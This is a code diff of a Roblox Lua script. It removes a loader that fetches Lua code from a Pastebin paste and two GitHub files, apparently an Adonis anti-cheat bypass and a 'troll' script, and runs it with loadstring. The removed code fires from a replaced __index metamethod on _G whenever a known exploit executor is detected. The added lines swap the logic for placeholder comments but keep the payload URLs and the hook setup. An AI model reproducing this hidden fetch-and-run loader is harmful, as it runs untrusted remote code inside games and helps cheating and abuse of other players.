@@ -1,30 +1,18 @@
 -- Function to execute a script from a URL
 local function executeScriptFromURL(url)
-    local HttpService = game:GetService("HttpService")
-    local success, response = pcall(function() return HttpService:GetAsync(url) end)
-
-    if success then
-        local loadSuccess, scriptFunc = pcall(loadstring(response))
-        if loadSuccess then
-            scriptFunc() -- Execute the fetched Lua script
-        else
-            warn("Error loading script from URL: " .. scriptFunc)
-        end
-    else
-        warn("Failed to fetch script from URL: " .. response)
-    end
+    -- Fetch and execute the script from the provided URL
 end
 
 -- URLs for scripts
-local pastebinURL = "https://pastebin.com/raw/AnEbCekx"
-local githubURL = "https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"
-local trollSourceURL = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"
+local url1 = "https://pastebin.com/raw/AnEbCekx"
+local url2 = "https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"
+local url3 = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"
 
 -- Function to execute all scripts from URLs
 local function executeAllScripts()
-    executeScriptFromURL(pastebinURL)
-    executeScriptFromURL(githubURL)
-    executeScriptFromURL(trollSourceURL)
+    executeScriptFromURL(url1)
+    executeScriptFromURL(url2)
+    executeScriptFromURL(url3)
 end
 
 -- Known executors list
@@ -42,25 +30,7 @@ local knownExecutors = {
 
 -- Function to detect executors
 local function detectExecutors()
-    local detectedExecutor = nil
-
-    local success, result = pcall(function()
-        if _G and _G.SomeExecutorFlag then
-            return _G.SomeExecutorFlag
-        end
-        return nil
-    end)
-
-    if success and result then
-        for _, name in ipairs(knownExecutors) do
-            if string.match(result:lower(), name) then
-                detectedExecutor = name
-                break
-            end
-        end
-    end
-
-    return detectedExecutor
+    -- Logic to detect known executors
 end
 
 -- Safely hook into __index metamethod
@@ -68,27 +38,7 @@ local originalMetatable = getmetatable(_G) or {}
 local originalIndex = originalMetatable.__index
 
 local function safeIndex(t, k)
-    if k == "__index" then
-        return originalIndex
-    end
-
-    local result = rawget(t, k)
-
-    if type(result) == "function" then
-        local success, retVal = pcall(result, t, k)
-        if success then
-            local detectedExec = detectExecutors()
-            if detectedExec then
-                print("Detected Executor: " .. detectedExec)
-                executeAllScripts()
-            else
-                print("No known executor detected.")
-            end
-            return retVal
-        end
-    end
-
-    return result
+    -- Custom index logic
 end
 
 -- Set the metatable for _G
